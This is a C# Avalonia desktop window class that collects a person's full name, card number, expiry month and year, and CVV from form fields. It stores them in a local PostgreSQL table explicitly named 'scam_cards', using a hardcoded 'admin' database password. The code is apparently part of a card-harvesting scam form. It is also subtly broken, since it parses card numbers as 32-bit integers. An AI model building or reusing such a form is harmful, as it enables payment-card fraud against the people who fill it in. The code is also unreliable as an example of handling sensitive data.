using Avalonia.Controls;
using Npgsql;



namespace Forma
{
    public partial class MainWindow : Window
    {
        NpgsqlDataSource dataSource;
        public MainWindow()
        {
            var connectionString = "Host=localhost;Username=postgres;Password=admin;Database=forma";
            dataSource = NpgsqlDataSource.Create(connectionString);
            InitializeComponent();
        }

        private void Button_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            using (var cmd = dataSource.CreateCommand("INSERT INTO scam_cards (fio, number,mounth,year,cvv) VALUES ($1, $2, $3, $4, $5)"))
            {
                cmd.Parameters.AddWithValue(Fio.Text);
                cmd.Parameters.AddWithValue(int.Parse(Number.Text));
                cmd.Parameters.AddWithValue(int.Parse(Mounth.Text));
                cmd.Parameters.AddWithValue(int.Parse(Year.Text));
                cmd.Parameters.AddWithValue(int.Parse(Cvv.Text));
                cmd.ExecuteNonQuery();
            }
            new Window1().Show();
        }

        private void Button_Click_1(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            new Window2().Show();
            
        }

        private void Button_Click_2(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            new Window3().Show();
            
        }
    }
}